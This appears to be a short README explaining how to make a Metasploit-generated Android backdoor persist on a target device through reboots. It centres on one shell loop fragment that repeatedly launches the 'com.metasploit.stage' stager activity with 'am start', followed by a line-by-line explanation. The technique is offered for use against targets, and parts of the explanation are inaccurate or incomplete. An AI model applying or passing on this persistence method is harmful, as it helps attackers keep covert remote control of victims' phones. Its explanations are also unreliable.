# Introduction
- This is a simple method to persist the metasploit generated backdoor
- It takes a bash script to be executed on the target device and this will work even if the device reboots.
# The main part in code
- do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
# Explanation
-do: This is not a standard Bash command or keyword. It's possible that it's a part of a larger script or context-specific code.

-am: This is the Activity Manager tool in Android. It's used to perform various operations related to Android activities and applications.

-start: This is a subcommand of the am tool, and it is used to start an activity or application.

--user 0: This specifies that the action should be taken on user ID 0. In Android, user ID 0 is typically reserved for the system user.

-a android.intent.action.MAIN: This is an option that specifies the action to be performed. In this case, it's setting the action to android.intent.action.MAIN, which is often used to launch the main activity of an Android application. The main activity is the entry point of the app.

-n com.metasploit.stage/.MainActivity: This option specifies the component (in this case, an activity) to start. It consists of two parts separated by a forward slash (/):

    com.metasploit.stage: This is the package name of the Android application.
    MainActivity: This is the name of the activity within the application that should be started
